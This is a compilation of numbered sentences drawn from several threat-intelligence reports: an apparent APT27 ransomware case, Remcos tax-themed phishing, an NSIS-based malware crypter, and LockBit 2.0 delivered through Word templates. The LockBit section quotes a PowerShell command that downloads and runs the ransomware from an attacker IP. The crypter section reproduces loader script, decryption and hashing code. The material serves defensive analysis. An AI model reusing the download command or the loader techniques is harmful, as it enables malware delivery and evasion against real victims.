sentence.12324: Fortunately, however, SCCM was used on the client infrastructure, with client-side agents running on all the encrypted computers.
sentence.12325: The information we needed was stored centrally and had not been tampered with: all we needed was some trial-and-error to choose the right values.
sentence.12326: Now that we had relatively precise uptime values, we needed to determine when the ransomware had run.
sentence.12327: Remember that at the end, the malware deletes the intermediate DLL library and encrypted ransomware, but not the legitimate executable file whose process is used for performing the malicious actions.
sentence.12328: In other words, the time at which this file appeared on the system should be the approximate time when the ransomware ran, to within several seconds.
sentence.12329: We succeeded in bruteforcing the exact value of the base encryption key in about a minute on an ordinary workstation (on the order of a few tens of thousands of iterations).
sentence.12330: We could then decrypt the remaining files.
sentence.12331: In a few cases, we had a tougher time bruteforcing the key at first.
sentence.12332: The reason was that the timezones had been set incorrectly.

sentence.12334: Attribution We mentioned the SysUpdate and HyperBro backdoors from the attackers' toolkit.
sentence.12335: These are somewhat esoteric Remote Access Trojans used by the APT27 group (also known as Bronze Union, LuckyMouse, Emissary Panda, or Iron Tiger).
sentence.12336: The group likely has Asian roots, with activity since at least 2010.
sentence.12337: The group focuses its attention on government targets in the defense and energy industries, as well as aerospace and manufacturing.
sentence.12338: Most commonly, the original attack vector is a compromise of the victim's web servers by exploiting vulnerabilities, bruteforcing credentials, or taking advantage of web server misconfigurations.
sentence.12339: Despite the similarities in tactics, techniques, and procedures (TTPs) and use of a telltale toolkit, some of the team's researchers are skeptical about attribution of the attacks to APT27.
sentence.12341: Choice of target Media companies had never been of interest for APT27.
sentence.12342: This is consistent with the findings of our incident investigation: the attackers did not try to access private information on the target infrastructure, instead only running software for direct financial gain.
sentence.12345: This is atypical and, moreover, ill-suited software that can quickly attract attention and wreck any plans for long-term cyberspying.
sentence.12346: The URL address to which the ransomware "phones home" upon completing its work does not have anything in common with APT27 network infrastructure.
sentence.12347: Of course, some groups (such as Lazarus and Winnti) combine cyberspying with direct financial motivations, so perhaps APT27 is broadening its previously limited range of interests.
sentence.12348: Or, as an alternative, the group has reached an agreement with other attackers for use of their software in return for a part of the proceeds.
sentence.12349: In favor of attribution of Polar to APT27, we can note the sequence of payload, execution, and naming: the encrypted SysUpdate backdoor is often named sys.bin.url and the Polar ransomware was named Sysurl.

sentence.12370: Bodies of the SysUpdate and HyperBro backdoors We were not able in some cases to confirm the presence of a given backdoor based on the body of the Trojan itself.
sentence.12371: We identified the HyperBro backdoor, which had been used in 2018, based on the distinctive file name combined with other confirmed tools.
sentence.12372: We confirmed the SysUpdate backdoor, used in 2020, by looking at the C2 address and backdoor body in the process dump memory that had been uploaded to VirusTotal during investigation from an organization not linked to our client.
sentence.12373: Taken together, these similarities certainly point to APT27 as a culprit, but are not entirely conclusive.
sentence.12374: Therefore we leave it to the reader to choose whether to concur regarding involvement by APT27. Conclusion In this article, we have described an APT27 attack on a media company.
sentence.12375: The cybercriminals obtained access to the company's headquarters by compromising an office in a foreign country.
sentence.12376: They maintained control of the infrastructure for two years.
sentence.12377: They used both publicly available and custom-developed tools that had been seen previously.
sentence.12378: The hackers, while not changing their TTPs, chose rather unusual software to monetize their attacks.
sentence.12379: Perhaps the compromise of this client was an accident and this was merely an attempt to obtain at least some benefit.
sentence.12380: User data was encrypted, after which a ransom demand was made.
sentence.12381: A mistake in the ransomware's cryptographic algorithms enabled us to recover the encrypted files.
sentence.12382: To our knowledge, the attackers did not obtain access to information of any value whatsoever, ultimately leaving them with nothing to show for their efforts.

sentence.12388: title: Threat actors strive to cause Tax Day headaches url: https://www.microsoft.com/en-us/security/blog/2023/04/13/threat-actors-strive-to-cause-tax-day-headaches/ Threat actors often take advantage of current events and major news headlines to align attacks and leverage social engineering when people could be more likely to be distracted or misled.
sentence.12389: Tax season is particularly appealing to threat actors because not only are people busy and under stress, but it is intrinsically tied to financial information.
sentence.12390: With U.S. Tax Day approaching, Microsoft has observed phishing attacks targeting accounting and tax return preparation firms to deliver the Remcos remote access trojan (RAT) and compromise target networks beginning in February of this year.
sentence.12391: Remcos, which stands for “Remote Control and Surveillance”, is a closed-source tool that allows threat actors to gain administrator privileges on Windows systems remotely.
sentence.12392: It was released in 2016 by BreakingSecurity, a European company that markets Remcos and other offensive security tools as legitimate software.
sentence.12393: In 2021, CISA listed Remcos among its top malware strains, citing its use in mass phishing attacks using COVID-19 pandemic themes targeting businesses and individuals.
sentence.12394: While social engineering lures like this one are common around Tax Day and other big topic current events, these campaigns are specific and targeted in a way that is uncommon.
sentence.12395: The targets for this threat are exclusively organizations that deal with tax preparation, financial services, CPA and accounting firms, and professional service firms dealing in bookkeeping and tax.
sentence.12396: This campaign can be detected in Microsoft Defender Antivirus, built into Windows and on by default, as well as Microsoft 365 Defender.
sentence.12397: The campaign uses lures masquerading as tax documentation sent by a client, while the link in the email uses a legitimate click-tracking service to evade detection.
sentence.12398: The target is then redirected to a legitimate file hosting site, where the actor has uploaded Windows shortcut (.LNK) files.
sentence.12400: Remcos malware phishing lure These LNK files generate web requests to actor-controlled domains and/or IP addresses to download malicious files.
sentence.12401: These malicious files then perform actions on the target device and download the Remcos payload, providing the actor potential access to the target device and network.
sentence.12402: Microsoft is sharing this information along with detections and recommendations with the community to help users and defenders stay vigilant against this campaign with Tax Day approaching in the U.S. on April 18.
sentence.12403: Microsoft 365 Defender and Microsoft Defender Antivirus detect and block Remcos and other malicious activity related to this campaign.
sentence.12404: Phishing campaign analysis What we have observed is that the link in the phishing email points to Amazon Web Services click tracking service at awstrack[.]me.
sentence.12405: The initial link then redirects the target to a ZIP file hosted on legitimate file-sharing service spaces[.]hightail[.]com.
sentence.12406: The ZIP file contains LNK files that act as Windows shortcuts to other files.
sentence.12407: The LNK files make web requests to actor-controlled domains and IP addresses to download additional malicious files such as MSI files containing DLLs or executables, VBScript files containing PowerShell commands, or deceptive PDFs.
sentence.12409: Unpacked file names referencing tax documents in the malware In some cases, GuLoader was used to execute shellcode and subsequently download Remcos on the target system.
sentence.12410: GuLoader is a malicious downloader that has been used by many different actors to deliver a wide variety of malware, including several RATs such as Remcos, through phishing campaigns since it was first observed in the wild in December 2019.
sentence.12411: The downloader uses several techniques to evade analysis and detection such as using legitimate file-sharing sites and cloud hosting services for payload storage and delivery as well as encryption and obfuscation of the GuLoader shellcode and payloads.
sentence.12412: Successful delivery of a Remcos payload could provide an attacker the opportunity to take control of the target device to steal information and/or move laterally through the target network.
sentence.12414: Tax Day-themed Remcos attack chain We continue to learn from these campaigns to improve how we protect customers.
sentence.12415: Recommendations and detections Microsoft recommends the following mitigations to reduce the impact of this threat: Block JavaScript or VBScript from launching downloaded executable content Block executable files from running unless they meet a prevalence, age, or trusted list criterion Enable Microsoft Defender Antivirus scanning of downloaded files and attachments Enable Microsoft Defender Antivirus real-time behavior monitoring Enable cloud-delivered protection Detection details Microsoft Defender for Office 365 Microsoft Defender for Office 365 detects phishing emails associated with the campaign discussed in this blog.
sentence.12416: Microsoft Defender Antivirus Microsoft Defender Antivirus, on by default on Windows machines, detects threat components as the following malware: Backdoor:Win32/Remcos.
sentence.12417: GA!MTB Microsoft Defender for Endpoint Alerts with the following titles in the security center can indicate threat activity on your network: ‘Remcos’ backdoor Suspicious ‘Remcos’ behavior ‘Remcos’ malware ‘Guloader’ malware Microsoft Sentinel Microsoft Sentinel customers can use the TI Mapping analytic (a series of analytics all prefixed with “TI map”) to automatically match the indicators mentioned in this blog post with data in their workspace.
sentence.12418: If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the Microsoft Sentinel Content Hub to have the analytics rule deployed in their Sentinel workspace.
sentence.12419: More details on the Content Hub can be found here: https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy Indicators of compromise (IOCs)

sentence.12421: title: Revisiting the NSIS-based crypter url: https://blog.malwarebytes.com/threat-analysis/2021/05/revisiting-the-nsis-based-crypter/
sentence.12422: This blog post was authored by hasherezade NSIS (Nullsoft Scriptable Install System) is a framework dedicated to creating software installers.
sentence.12423: It allows to bundle various elements of an application together (i.e. the main executable, used DLLs, configs), along with a script that controls where are they going to be extracted, and what their execution order is.
sentence.12424: It is a free and powerful tool, making distribution of software easier.
sentence.12425: Unfortunately, its qualities are known not only to legitimate developers but also to malware distributors.
sentence.12426: For several years we have been observing malware distributed via NSIS-based crypters.
sentence.12427: The outer layer made of a popular and legitimate tool makes for a perfect cover.
sentence.12428: The flexibility of the installer allows to implement various ideas for obfuscating malicious elements.
sentence.12429: We wrote about unpacking them in the past, i.e. here, and here.
sentence.12430: With time their internal structure has evolved, so we decided to revisit them and describe the inside again using samples from some of the Formbook stealer campaigns.
sentence.12431: Samples This analysis is based on the following samples: 8F80426CEC76E7C9573A9C58072399AF carrying a Formbook sample: 05dc8c8d912a58a5dde38859e741b2c098061CCF694005A78FCF0FBC8810D137carrying a Formbook sample: f34bd301f4f4d53e2d069b4842bca672 Inside Like every NSIS-based installer, this executable is an archive that can be unpacked with the help of 7zip.
sentence.12432: The older versions of 7zip (i.e.15.05) were also able to extract the NSIS script:
sentence.12434: Unfortunately, in the newer releases script extraction is no longer supported.
sentence.12435: Once we unpack the file, we can see several elements, as well as directories typical for NSIS:
sentence.12436: The System.dll is a DLL typical for any NSIS installer, responsible for executing the commands from the script.
sentence.12437: It is the first component of the archive to be loaded.
sentence.12438: We can find it in each of the samples.
sentence.12439: What is more interesting are the files in the main directory.
sentence.12440: The first one, 1 KB in size, is a shellcode.
sentence.12441: It starts from bytes: 0x55, 0x8B, 0xEC, 0x81, 0xEC Analogous shellcode can be found in the second sample from this campaign.
sentence.12442: In the same directory there are two other files.
sentence.12443: One of them is around 7 KB, and the next: much bigger.
sentence.12444: Both of them are encrypted, and to find out what they contain we need to analyze the full chain of loading.
sentence.12445: Looking inside the NSIS script we can see the performed actions that are very simple: Function .onInit InitPluginsDir SetOutPath
sentence.12446: $INSTDIR File 5e9ikl8w3iif7ipp6 File 3ugs67ip868x5n File tjdorfrldbgdlq System::Alloc 1024 Pop $0 System::Call "kernel32::CreateFile(t'$INSTDIR\tjdorfrldbgdlq', i 0x80000000, i 0, p 0, i 3, i 0, i 0)i.r10" System::Call "kernel32::VirtualProtect(i r0, i 1024, i 0x40, p0)p.r1" System::Call "kernel32::ReadFile(i r10, i r0, i 1024, t., i 0)
sentence.12449: [...] The first file of the set (containing the shellcode) is read into the executable memory.
sentence.12450: Then, the loaded module is just called.
sentence.12451: Shellcode #1 – functionality If we load those shellcodes into IDA we can see their functionality very clearly, as they are not obfuscated.
sentence.12452: Shellcode from sample #1: Shellcode from sample #2 Although the code is a bit different in both, they can be divided with the same steps and building blocks.
sentence.12453: The name of the next file is loaded as a stack-based wide stringThe base of kernel32.dll is fetched from PEBA set of function from kernel32.dll is retrieved – each of them by the name’s checksums.
sentence.12454: Functions are always the same – dedicated to reading the file from the disk: CreateFileW, GetTempPathW, lstrcatW, ReadFile, VirtualAlloc, GetTempPathW.The function GetTempPathW is used to retrieve the path to the %TEMP% directory, where all the components from the archive were automatically extracted at runtime of the NSIS fileThe name of the next file is concatenated to the the %TEMP% pathMemory is allocated for the file content, and the file is read into this bufferA custom decryption algorithm is being applied on the buffer (the algorithm is different for different samples).
sentence.12455: The buffer turns out to be a next shellcodeFinally, the next shellcode is executed The name of the next file is loaded as a stack-based wide string The hashing function used for import resolving follows the same pattern in both cases, yet the constant used to initialize it (denoted as HASH_INIT) is different across the samples.
sentence.12459: *name) { int next_chunk; int hash; for ( hash = HASH_INIT; ; hash = next_chunk + 33 * hash ) { next_chunk = *name++; if ( !next_chunk ) break; } return hash; } view raw nsis_calc_hash.cpp hosted with :red_heart: by GitHub The algorithm used for the buffer decryption differs across the samples.
sentence.12460: The second shellcode revealed after the unpacking algorithm finished processing Shellcode #2 – functionality This shellcode is used for decrypting and loading the final payload (PE file) from the third of the encrypted files.
sentence.12461: It is unpacked and ran by the previous layer.
sentence.12462: In the analyzed cases, this element was around 7-8 KB.
sentence.12463: This shellcode is similarly structured as the previous one.
sentence.12464: It starts by preparation of the strings: stack-based strings are being pushed.
sentence.12465: One of them is the name of the next file that is going to be loaded.
sentence.12466: Also, the key that will be used for the decryption is prepared.
sentence.12467: The next step is loading of the imported functions.
sentence.12468: As before, they are resolved by their hashes.
sentence.12469: Then the functions are used to load and decrypt the payload.
sentence.12470: If loading the next stage has failed, the installer will restart itself.
sentence.12471: The decryption function is custom, similar (but not identical) to RC4: void __stdcall decrypt_buf(BYTE *data, BYTE *key, unsigned int size) { BYTE key_stream[512]; int j; char next;
sentence.12472: int i; int v6 = 0; int v4 = 0; for ( i = 0;
sentence.12473: i < 256; ++i ) { key_stream[i + 256] = i; key_stream[i] = key[i % size]; } for ( i = 0; i < 256; ++i ) { v6 = (key_stream[i] + v6 + key_stream[i + 256]) % 256; next = key_stream[v6 + 256]; key_stream[v6 + 256] = key_stream[i + 256]; key_stream[i + 256] = next; } v6 = 0; for ( j = 0; j < DATA_SIZE; ++j ) { i = (i + 1) % 256; v6 = (v6 + key_stream[i + 256]) % 256; next = key_stream[v6 + 256]; key_stream[v6 + 256] = key_stream[i + 256]; key_stream[i + 256] = next; v4 = (key_stream[v6 + 256] + key_stream[i + 256]) % 256; data[j] ^=
sentence.12474: key[j % size]; data[j] ^= key_stream[v4 + 256]; } } view raw nsis_decrypt.cpp hosted with :red_heart: by GitHub
sentence.12475: This algorithm is common to both analyzed samples – yet the decryption key differs.
sentence.12476: Loading PE After the PE is decrypted, the function for its loading is deployed.
sentence.12477: The payload is implanted into a newly created suspended process (a new instance of the current executable) using one of the most popular techniques of PE injection: Process Hollowing (a.k.a. RunPE).
sentence.12478: The content of the payload is mapped into the new process using low level APIs: NtCreateSection, NtMapViewOfSection.
sentence.12479: Then, the Entry Point is redirected to the new executable via SetThreadContext, and finally the execution is resumed with NtResumeThread.
sentence.12480: The authors used several common techniques to obfuscate this process.
sentence.12481: As before, the used functions are loaded by their checksums.
sentence.12482: The PE loading function makes a use of the following set: The low-level functions, directly related with performing the injection, are called via raw syscalls retrieved directly from NTDLL.
sentence.12483: Also in this case, functions has been resolved by their hashes.
sentence.12484: List of used functions (with corresponding hashes).
sentence.12486: e0ddd5cb : NtMapViewOfSection 20b0f111 : NtResumeThread 81af6d4e : NtUnmapViewOfSection be530033 : NtWriteVirtualMemory The code used to resolve the hashes is available here: hash_resolver.cpp.
sentence.12487: Overview of the PE loader Manual syscalls calling
sentence.12488: In order to make the injection stealthier, the loader uses a common technique of “stealing syscalls”, also known as “hell’s gate”.
sentence.12489: This technique is based on the fact that some low-level DLLs, such as NTDLL, contain numbers of raw syscalls.
sentence.12490: By extracting the syscalls, and executing them manually, the malware can use the API of the operating system, without a need of calling functions from the DLL.
sentence.12491: That allows to bypass some monitoring in the situation if the system DLLs are hooked.
sentence.12492: More in-depth analysis of this technique was described here.
sentence.12493: Firstly, a fresh copy of NTDLL is loaded from the file on the disk, an manually mapped.
sentence.12494: Then, a function defined by its hash is retrieved (using the same hashing algorithm that was used to retrieve imports from normally loaded DLLs): After the pointer to the beginning of the function is fetched, a small disassembling loop is used to find the familiar pattern: moving the ID of the syscall into EAX register.
sentence.12495: The syscall ID is returned for further use.
sentence.12496: Once the syscall number has been extracted, the malware intends to execute it from its own code.
sentence.12497: However, a 32-bit application cannot make direct syscalls on 64-bit system, since it is not native.
sentence.12498: In such cases, syscalls are usually made via Wow64 emulation layer.
sentence.12499: In order to make them directly, the authors of the malware switch to the 64-bit mode first: using a technique called “Heaven’s Gate”.
sentence.12500: The malware comes with two variants of the stub executing a syscall.
sentence.12501: The decision for which of the versions should be applied is made based on the check if the process runs as Wow64 (emulated 32 bit on 64 bit Windows): If the process runs on a 32-bit system, the syscall can be made in a direct way, using SYSENTER:
sentence.12502: If the system is 64-bit, the malware (that is 32-bit) switches into 64-bit mode via “Heaven’s Gate”.
sentence.12503: Far return to the address prefixed with 0x33 segment – entering the 64-bit mode Once the execution mode is changed into 64 bit, the syscall is called, its results stored, and the application can switch back to 32-bit mode to continue normal execution.
sentence.12504: The 64-bit code, executed after the mode is switched via Heaven’s Gate Evolution This crypter has been around for several years, and during this time it went through several phases of evolution.
sentence.12505: In this part of the analysis we will compare it with the earlier version from February of this year, described in the following writeup.
sentence.12506: In contrast to the current one, the version from February contained a malicious component in the form of a DLL.
sentence.12507: We can also find a second, encrypted component, which carries the payload.
sentence.12508: The extracted NSIS script contains a different sequence of commands: Function .onInit SetOutPath
sentence.12509: $INSTDIR File $INSTDIR\o15bmldpqdxcin.dll File $INSTDIR\emvmcmzr.n System::Call $INSTDIR\o15bmldpqdxcin.dll::Gxkeoxkzs(w$\"$INSTDIR\emvmcmzr.n$\") DetailPrint label StrCpy $0 9 IntOp $0 $0 + 4 Goto $0 DetailPrint done FunctionEnd In this case, the standard NSIS component (System.dll) is used to call the function exported from the DLL, passing the path to the encrypted component as a parameter.
sentence.12510: Looking inside the exported function we can find a significant similarity to the Shellcode #1 which was described in the former part of this writeup.
sentence.12511: As before, we can see decryption of the next stage with the help of a custom algorithm.
sentence.12512: This time, the next stage is contained in a buffer hardcoded in the DLL (rather than stored in a separate file).
sentence.12513: It contains a very similar function dedicated to decrypting and loading the final payload.
sentence.12514: Yet, we can see some minor differences.
sentence.12515: First of all, the file name is passed dynamically rather than hardcoded.
sentence.12516: Second, we can see a check against blacklisted processes.
sentence.12517: Their names are hashed, and compared to the hardcoded list of hashes (i.e. 0x26090612 -> “avgui.exe”).
sentence.12518: This type of checks are among common evasion techniques.
sentence.12519: However, in this case, detection of a forbidden process only delays execution, and does not suspend it or terminate.
sentence.12520: Possibly it is a bug in the implementation, and the if statement was intended to be a while loop instead.
sentence.12521: Nevertheless, the authors decided to give up the check in the latest version.
sentence.12522: Apart from those details, this stage is identical to the Shellcode #2 from the newer version.
sentence.12524: This packer has been around for many years, and probably will stay with us for some years to come.
sentence.12525: Its structure shows that it is created by experienced authors, using well known, yet not trivial techniques.
sentence.12526: Its evolution is slow but steady.
sentence.12527: Usage of a popular installation engine makes it easy to blend in with legitimate applications.
sentence.12528: Its popularity and diversity of payloads suggests that it is not linked to one specific actor, but rather sold as an independent component on one of many underground forums.

sentence.12530: title: LockBit Ransomware 2.0 Resurfaces url: https://blog.cyble.com/2023/06/06/lockbit-ransomware-2-0-resurfaces/ Threat Actor Targeting Korean Users through malicious Document Files Cyble Research and Intelligence Labs (CRIL) recently discovered an ongoing campaign associated with the notorious ransomware group LockBit.
sentence.12531: LockBit has been actively operating since September 2019 and consistently employs various methods to spread its malware.
sentence.12532: These tactics include distributing phishing emails containing malicious files, utilizing drive-by downloads, and exploiting vulnerabilities in the remote desktop protocol (RDP).
sentence.12533: As a result, LockBit has established itself as a prominent and active threat actor in the realm of ransomware.
sentence.12534: The LockBit ransomware group utilizes a double extortion technique to enhance their likelihood of obtaining ransom payments from victims.
sentence.12535: This technique encompasses multiple stages, including data encryption to render victim data inaccessible and threats to release stolen data on designated leak sites.
sentence.12536: By employing this approach, the group aims to exert significant pressure on victims, compelling them to comply with their demands and pay the ransom.
sentence.12537: LockBit ransomware’s maldocs campaign, initially detected in 2022, had specifically targeted individuals in Korea.
sentence.12538: In their latest campaign, LockBit has once again embraced the approach of disseminating malware through malicious document files targeting Korean individuals.
sentence.12539: Notably, the group utilized the same template injection techniques to deliver their payload.
sentence.12540: The figure below depicts the delivery method employed by the LockBit ransomware group.
sentence.12541: Figure 1 – Lockbit’s Delivery Mechanism Technical Analysis For analysis purposes, we have taken a specific sample (sha256: 7391bbd59330e79f8ee4a01e5ed20df5ab183737f2b91f926b649facd8d2d278) which is a .docx file commonly known as Office Open XML (OOXML).
sentence.12542: OOXML files are essentially packaged ZIP archives that consist of multiple XML files called parts.
sentence.12543: These parts contain various properties that collectively determine the document’s display and processing.
sentence.12544: Within these parts, certain properties may reference shared public resources accessible through online URLs.
sentence.12545: It is also observed that the original filenames of the identified .docx samples were written in the Korean language.
sentence.12546: The below image shows the malicious document.
sentence.12547: Figure 2 – malicious document Upon opening the malicious document, it attempts to establish a connection with the remote server to retrieve the subsequent component of the attack.
sentence.12548: This process involves multiple stages of execution.
sentence.12549: In the initial stage, a URL hosting the malicious template file (.dotm) is injected into settings.xml.rels file that resides within the document package.
sentence.12550: This enables the document to fetch the .dotm file from the remote server required for further actions.
sentence.12551: This technique employed by the attackers aligns with CVE-2017-0199.
sentence.12552: The below image shows the extracted content of the document file.
sentence.12553: Figure 3 – Extracted content of docx file The below figure displays the contents of the settings.xml.rels file, highlighting the inclusion of a malicious URL and the presence of the Target mode within the settings.xml.rels file.
sentence.12554: Figure 4 – settings.xml.rels file content Once a successful connection to the remote server is established, a malicious template file is downloaded and executed.
sentence.12555: The downloaded template file contains an obfuscated VBA macro.
sentence.12556: TAs have opted for this technique due to its ability to bypass detection mechanisms.
sentence.12557: Unlike traditional methods that rely on suspicious indicators such as macros, this technique does not require their presence in the document until the malicious template is retrieved.
sentence.12558: The image below displays the de-Obfuscated VBA content from the downloaded template file.
sentence.12559: Figure 5 – De-obfuscated macro content The VBA script incorporates a PowerShell command mentioned below to trigger the retrieval of the final stage payload, which is an executable file named “tinytask.exe” from the remote server.
sentence.12560: Following the successful download, the script saves the obtained payload in the directory “C:\Users\Public\456trytgre3e45yrthtgr.exe” on the compromised system and proceeds to execute it.
sentence.12561: “cmd /c powershell/W 01 curl hxxp://91[.]107[.]210[.]207/tinytask.exe -o C:\Users\Public\456trytgre3e45yrthtgr.exe; C:\Users\Public\456trytgre3e45yrthtgr.exe” The downloaded payload is Lockbit ransomware 2.0.
sentence.12562: LockBit Ransomware: After the LockBit ransomware successfully executes on a system, it initiates a series of actions.
sentence.12563: These actions include encrypting files with .lockbit extension, modifying Windows automatic backups by deleting shadow copies using vssadmin.exe, disabling startup repairs using the bcdedit tool, and more.
sentence.12564: The below figure shows the encrypted files with the .lockbit extension.
sentence.12565: Figure 6 – Encrypted files & Extensions Additionally, the ransomware leaves a ransom note that provides detailed instructions for making the required payment, as shown in the below figure.
sentence.12566: Figure 7 – Lockbit’s Ransom note We recommend referring to our previous blog post to comprehensively examine LockBit 2.0 and Lockbit 3.0 ransomware.
sentence.12567: Conclusion The Lockbit ransomware has taken a surprising turn by adopting the old strategy of distributing its payload through malicious documents.
sentence.12568: This shift in behavior has caught us off guard, making it difficult to predict the motives behind this change.
sentence.12569: However, it is evident that Lockbit remains a significant threat, continuously evolving and expanding its capabilities.
sentence.12570: Therefore, users must remain vigilant and adopt robust security measures to protect against potential Lockbit ransomware attacks.
sentence.12571: Cyble Research & Intelligence Labs continuously monitor ransomware campaigns and will keep updating our readers with the latest information.
sentence.12572: Our Recommendations We have listed some essential cybersecurity best practices that create the first line of control against attackers.
sentence.12573: We recommend that our readers follow the best practices given below: Safety Measures Needed to Prevent Ransomware Attacks Conduct regular backup practices and keep those backups offline or in a separate network.
sentence.12574: Turn on the automatic software update feature on your computer, mobile, and other connected devices wherever possible and pragmatic.
sentence.12575: Use a reputed anti-virus and Internet security software package on your connected devices, including PC, laptop, and mobile.
sentence.12576: Refrain from opening untrusted links and email attachments without verifying their authenticity.
sentence.12577: Users Should Take the Following Steps After the Ransomware Attack Detach infected devices on the same network.
sentence.12578: Disconnect external storage devices if connected.
sentence.12579: Inspect system logs for suspicious events.
sentence.12580: Impact of Ransomware Loss of Valuable data.
